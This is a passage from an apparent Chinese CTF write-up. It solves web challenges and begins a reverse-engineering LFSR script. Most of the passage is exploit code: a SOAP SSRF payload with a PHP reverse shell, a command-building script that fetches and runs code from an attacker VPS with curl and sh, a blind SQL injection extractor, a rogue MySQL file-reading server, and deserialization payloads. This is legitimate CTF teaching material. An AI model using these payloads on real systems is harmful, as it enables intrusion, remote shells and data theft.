t)</span></span><br><span class="line">        <span class="comment">#print payload</span></span><br><span class="line">        r = requests.post(url=<span class="string">"http://121.37.179.47:8081/verifyFlag"</span>, headers=headers, data=payload)</span><br><span class="line">        tt = time.time() - t</span><br><span class="line">        alls.append(&#123;<span class="string">"time"</span>:tt,<span class="string">"v"</span>:f&#125;)</span><br><span class="line">        <span class="keyword">print</span> f,tt,r,len(r.text),payload</span><br><span class="line"></span><br><span class="line">    alls.sort()</span><br><span class="line">    ext = alls[<span class="number">-1</span>][<span class="string">"v"</span>] + ext</span><br><span class="line">    <span class="keyword">print</span> alls[<span class="number">-3</span>:]</span><br><span class="line">    <span class="keyword">print</span> i, flag, ext</span><br></pre></td></tr></table></figure><p>服务器一触发redos就挂，挂一台跑一位出来（运维大哥别打我 最后跑出结果<code>g3tFLAaGEAxY</code>， flag：flag{g3tFLAaGEAxY}</p><p>后来发现题目超时就断开了，更容易跑了。。</p><h2><span id="php-uaf">PHP-UAF</span></h2><p>PHP 7.4.2，直接用现成exp打 https://github.com/mm0r1/exploits <img src="https://i.loli.net/2020/03/10/qyQlDtfoXRPJWaU.png" alt="uaf1.png"> <img src="https://i.loli.net/2020/03/10/3XBGSrfZAikdboY.png" alt="uaf2.png"></p><h2><span id="happyvacation">happyvacation</span></h2><p>http://159.138.4.209:1002/.git git泄露源码 审计代码发现答题的地方有个eval，answer参数有几个过滤，不能直接命令注入 <img src="https://i.loli.net/2020/03/10/o76XeFMPqwRJVrm.png" alt="hv1.png"> 但是看到this-&gt;user引入了上一层的<code>$user</code>，想到另外还有个上传点，于是构造 <img src="https://i.loli.net/2020/03/10/MflbKRHQJrNcYyA.png" alt="hv2.png"> 把uploader中的上传后缀黑名单清除，就能上传php文件了 <img src="https://i.loli.net/2020/03/10/LQMReVptW17Ckhn.png" alt="hv3.png"> <img src="https://i.loli.net/2020/03/10/j2IesPEaBAzNLyR.png" alt="hv4.png"> 最后直接读取/flag <img src="https://i.loli.net/2020/03/10/qkLXJn9pGKb6EM4.png" alt="hv5.png"></p><p>所以提示里的bot是啥玩意？</p><p>自欺欺人md5验证码又是啥玩意？ <img src="https://i.loli.net/2020/03/10/47y8PbxiM2muE96.png" alt="hv6.png"></p><h2><span id="nothardweb">nothardweb</span></h2><p>他key是mt_rand &amp; 0x5f5e0ff 0x5f5e0ff = 0b101111101011110000011111111 0的地方必然是0 也就是1的地方有两个可能 一共19个1，2**19 54w次也不多 如果爆破出来的key是对的 那么就能正常解密出来后面几组的数据 因为后面几组不需要iv的参与 就是可能得倒着解密 最后得到第一组密文之后直接异或明文就得到iv了</p><p>爆破key</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cccc=<span class="string">"%d0%d%d%d%d%d0%d0%d%d%d%d00000%d%d%d%d%d%d%d%d"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($a=<span class="number">0</span>; $a &lt; <span class="number">2</span>; $a++) &#123; </span><br><span class="line">    <span class="keyword">for</span> ($b=<span class="number">0</span>; $b &lt; <span class="number">2</span>; $b++) &#123; </span><br><span class="line">        <span class="keyword">for</span> ($c=<span class="number">0</span>; $c &lt; <span class="number">2</span>; $c++) &#123; </span><br><span class="line">            <span class="keyword">for</span> ($d=<span class="number">0</span>; $d &lt; <span class="number">2</span>; $d++) &#123; </span><br><span class="line">                <span class="keyword">for</span> ($e=<span class="number">0</span>; $e &lt; <span class="number">2</span>; $e++) &#123; </span><br><span class="line">                    <span class="keyword">for</span> ($f=<span class="number">0</span>; $f &lt; <span class="number">2</span>; $f++) &#123; </span><br><span class="line">                        <span class="keyword">for</span> ($g=<span class="number">0</span>; $g &lt; <span class="number">2</span>; $g++) &#123; </span><br><span class="line">                            <span class="keyword">for</span> ($h=<span class="number">0</span>; $h &lt; <span class="number">2</span>; $h++) &#123; </span><br><span class="line">                                <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">2</span>; $i++) &#123; </span><br><span class="line">                                    <span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt; <span class="number">2</span>; $j++) &#123; </span><br><span class="line">                                        <span class="keyword">for</span> ($k=<span class="number">0</span>; $k &lt; <span class="number">2</span>; $k++) &#123; </span><br><span class="line">                                            <span class="keyword">for</span> ($l=<span class="number">0</span>; $l &lt; <span class="number">2</span>; $l++) &#123; </span><br><span class="line">                                                <span class="keyword">for</span> ($m=<span class="number">0</span>; $m &lt; <span class="number">2</span>; $m++) &#123; </span><br><span class="line">                                                    <span class="keyword">for</span> ($n=<span class="number">0</span>; $n &lt; <span class="number">2</span>; $n++) &#123; </span><br><span class="line">                                                        <span class="keyword">for</span> ($o=<span class="number">0</span>; $o &lt; <span class="number">2</span>; $o++) &#123; </span><br><span class="line">                                                            <span class="keyword">for</span> ($p=<span class="number">0</span>; $p &lt; <span class="number">2</span>; $p++) &#123; </span><br><span class="line">                                                                <span class="keyword">for</span> ($q=<span class="number">0</span>; $q &lt; <span class="number">2</span>; $q++) &#123; </span><br><span class="line">                                                                    <span class="keyword">for</span> ($r=<span class="number">0</span>; $r &lt; <span class="number">2</span>; $r++) &#123; </span><br><span class="line">                                                                        <span class="keyword">for</span> ($s=<span class="number">0</span>; $s &lt; <span class="number">2</span>; $s++) &#123; </span><br><span class="line">                                                                            $f_key=sprintf($cccc,$a,$b,$c,$d,$e,$f,$g,$h,$i,$j,$k,$l,$m,$n,$o,$p,$q,$r,$s);</span><br><span class="line">                                                                            $key=base_convert($f_key,<span class="number">2</span>,<span class="number">10</span>);</span><br><span class="line">                                                                            $result=decode_aes($key);</span><br><span class="line">                                                                            <span class="keyword">if</span>(stripos($result,<span class="string">"guest"</span>))&#123;</span><br><span class="line">                                                                                <span class="keyword">echo</span> $result;</span><br><span class="line">                                                                                <span class="keyword">echo</span> $key.<span class="string">"\n"</span>;</span><br><span class="line">                                                                            &#125;</span><br><span class="line">                                                                        &#125;</span><br><span class="line">                                                                    &#125;</span><br><span class="line">                                                                &#125;</span><br><span class="line">                                                            &#125;</span><br><span class="line">                                                        &#125;</span><br><span class="line">                                                    &#125;</span><br><span class="line">                                                &#125;</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_aes</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">    $ch=base64_decode(<span class="string">"NGtWc0JCQ080dkNxcnhtVjVOSG1rQ3hWckRab3pjWkllTmdJMmovclR4YktzNk9FTERBSnYxSUNKVmQ4Qk55Qg=="</span>);</span><br><span class="line">    $de = openssl_decrypt($ch,<span class="string">"des-cbc"</span>,$key,<span class="number">0</span>,<span class="string">"abcdabcd"</span>);</span><br><span class="line">    <span class="keyword">return</span> $de;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到key之后逆推iv即可，然后构造soap反序列化ssrf即可</p><p>最后的payload :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key=<span class="string">"17834064"</span>;</span><br><span class="line">$iv=<span class="string">"85196940"</span>;</span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'uri'</span>=&gt;<span class="string">'http://10.10.1.12/index.php'</span>, <span class="string">'location'</span>=&gt;<span class="string">'http://10.10.1.12/index.php?cc=`$cc`;php+-r+%27%24sock%3Dfsockopen%28%22????%22%2C????%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27;'</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(openssl_encrypt($b,<span class="string">"des-cbc"</span>,$key,<span class="number">0</span>,$iv)).<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($b);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接用php弹shell了</p><p>然后发现根目录有个hint文件</p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200309210338-6449892e-6206-1.png" alt><figcaption>image.png</figcaption></figure><p>传个ew进去开隧道康康发现是个tomcat，可以直接put一个shell上去</p><p>然后就没有然后了，flag在根目录下</p><h2><span id="webtmp">webtmp</span></h2><p>pickle反序列化题，参考之前SUCTF 2019那题。</p><p>需要满足 result == Animal(secret.name, secret.category)</p><p>限制反序列化的class所属module为：<strong>main</strong></p><p>目标： 覆写<code>__main__.secret.name</code>为任意值（例如：aaa） 覆写<code>__main__.secret.category</code>为任意值（例如：bbb） 反序列化一个<code>__main__.Animal</code>的实例，令<code>self.name为aaa，self.category</code>为<code>bbb</code>。</p><p>Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x80\x03</span><br><span class="line">c__main__\nsecret\nN(S&apos;name&apos;\nS&apos;aaa&apos;\nd\x86b</span><br><span class="line">c__main__\nsecret\nN(S&apos;category&apos;\nS&apos;bbb&apos;\nd\x86b</span><br><span class="line">c__main__\nAnimal\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00aaaq\x04X\x08\x00\x00\x00categoryq\x05X\x03\x00\x00\x00bbbq\x06ub.</span><br></pre></td></tr></table></figure><p>Base64编码后： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gANjX19tYWluX18Kc2VjcmV0Ck4oUyduYW1lJwpTJ2FhYScKZIZiY19fbWFpbl9fCnNlY3JldApOKFMnY2F0ZWdvcnknClMnYmJiJwpkhmJjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA1gDAAAAYWFhcQRYCAAAAGNhdGVnb3J5cQVYAwAAAGJiYnEGdWIu</span><br></pre></td></tr></table></figure></p><p>提交拿到Flag： flag{409ed945-5b77-4ec3-97e1-b395778842ba}</p><h2><span id="hackme">hackme</span></h2><p>源码泄漏：www.zip</p><p>下载源码代码审计，在签名处存在反序列化漏洞，只要用户名为admin就能访问/core/index.php</p><p>php在获取 session 的时候，会按照 session.serialize_handler=php 规则来处理 session 文件，将 | 符号之前的所有内容认为是键名，之后的内容则用于反序列化。 <a href="https://blog.csdn.net/weixin_44304686/article/details/91539645" target="_blank" rel="noopener">参考链接</a></p><p>构造payload： O:4:"info":2:{s:5:"admin";i:1;s:4:"sign";s:4:"test";}</p><p>获取/core/index.php的内容，并发现是4字符getshell和data协议 。<a href="https://blog.csdn.net/qq_27446553/article/details/78502337?utm_source=blogxgwz6" target="_blank" rel="noopener">参考链接</a></p><p>data协议利用: compress.zlib://data:<span class="citation" data-cites="127.0.0.1/127.0.0.1?plain">@127.0.0.1/127.0.0.1?plain</span>;base64,xxxxx;</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line"></span><br><span class="line">hh = hackhttp.hackhttp()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">vps = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">ip = <span class="string">'0x'</span> + <span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))<span class="keyword">for</span> i <span class="keyword">in</span> vps.split(<span class="string">'.'</span>)])</span><br><span class="line"></span><br><span class="line">pos0 = <span class="string">'e'</span></span><br><span class="line"></span><br><span class="line">pos1 = <span class="string">'h'</span></span><br><span class="line"></span><br><span class="line">pos2 = <span class="string">'g'</span> </span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;%s\&gt;'</span> % pos0,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;%st-'</span> % pos1,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'*v&gt;%s'</span> % pos2,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;p'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;ph\\'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;1.\\'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;\&gt;\\'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">8</span>:<span class="number">10</span>],</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">6</span>:<span class="number">8</span>],</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">4</span>:<span class="number">6</span>],</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">2</span>:<span class="number">4</span>],</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">0</span>:<span class="number">2</span>],</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;\ \\'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;rl\\'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;cu\\'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'sh '</span> + pos2,</span><br><span class="line"></span><br><span class="line">    <span class="string">'sh '</span> + pos0,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">tmp = <span class="string">'''POST /core/ HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host: http://121.36.222.22:88</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Content-Length: 77</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Pragma: no-cache</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Cache-Control: no-cache</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Origin: http://121.36.222.22:88</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Referer: http://121.36.222.22:88/core/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=&#123;session&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">url=compress.zlib%3A%2F%2Fdata%3A%40127.0.0.1%2Fplain%3Bbase64%2C&#123;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line"></span><br><span class="line">    print(base64.b64encode(i).replace(<span class="string">'+'</span>,<span class="string">"%2B"</span>).replace(<span class="string">"="</span>,<span class="string">"%3D"</span>))</span><br><span class="line"></span><br><span class="line">    data = tmp.format(base64.b64encode(i).replace(<span class="string">'+'</span>,<span class="string">"%2B"</span>).replace(<span class="string">"="</span>,<span class="string">"%3D"</span>))</span><br><span class="line"></span><br><span class="line">    code, head, html, redirect, log = hh.http(<span class="string">'http://121.36.222.22:88/core/'</span>, raw=data)</span><br></pre></td></tr></table></figure><p>访问1.php并getflag</p><h2><span id="nweb">nweb</span></h2><p>注册用户</p><p>POST /regist.php HTTP/1.1 email=akkkw2&amp;pass=123456&amp;repass=b233gg&amp;type=110</p><p>参考注册页源代码，type改成110，注册一个有权限的账号。</p><p>/flag.php 有权限访问了</p><p>search.php存在盲注</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line">hhp = hackhttp.hackhttp()</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://121.37.179.47:1001/search.php'</span></span><br><span class="line"></span><br><span class="line">str1 = <span class="string">'''POST /search.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 121.37.179.47:1001</span></span><br><span class="line"><span class="string">Content-Length: 60</span></span><br><span class="line"><span class="string">Pragma: no-cache</span></span><br><span class="line"><span class="string">Cache-Control: no-cache</span></span><br><span class="line"><span class="string">Origin: http://121.37.179.47:1001</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span></span><br><span class="line"><span class="string">Referer: http://121.37.179.47:1001/search.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=tm931kor7tr5qnhd641nb9qrg7; username=6620aef2bb0988189fc2e05465b2c4d1</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">str2 = <span class="string">"flag=1'or ascii(substr((selselectect flag frfromom fl4g),&#123;&#125;,1))&gt;&#123;&#125;%23"</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    tmp = len(res) </span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">31</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        data = str1.format(str2.format(i,mid))</span><br><span class="line">        code, head, html, redirect, log = hhp.http(url, raw=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'!'</span> <span class="keyword">in</span>  html:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    res += chr(int(mid))</span><br><span class="line">    print(res)</span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">31</span>: </span><br><span class="line">        print(res[:<span class="number">-1</span>])</span><br><span class="line">        print(<span class="string">'emm.......'</span>)</span><br><span class="line">        exit(<span class="number">-1</span>)</span><br></pre></td></tr></table></figure><p>只能跑出一半的flag。 发现数据库username表里有admin用户.</p><p>账户:admin；密码:whoamiadmin，登陆进去有个<code>database.php</code>，猜测应该是利用Rouge Mysql读取另外一半flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8 </span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"/var/www/html/flag.php"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3309</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>flag另外一半在注释里面，拼接即可：flag{Rogue-MySql-Server-is-nday}</p><h2><span id="sqlcheckin">sqlcheckin</span></h2><p>原题。 payload: password='-0-' &gt;flag{ysffXdKecK8pmCEk}</p><h1><span id="re">Re</span></h1><h2><span id="clock">clock</span></h2><p>非线性反馈移位寄存器，强网杯2018 streamgame3改的，改改脚本可用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R, mask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></span><br><span class="line">    i = (R &amp; mask) &amp; <span class="number">0xffffff</span></span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">    output ^= lastbit</span><br><span class="line">    <span class="keyword">return</span> (output, lastbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_round</span><span class="params">(R1, R1_mask, R2, R2_mask, R3, R3_mask)</span>:</span></span><br><span class="line">  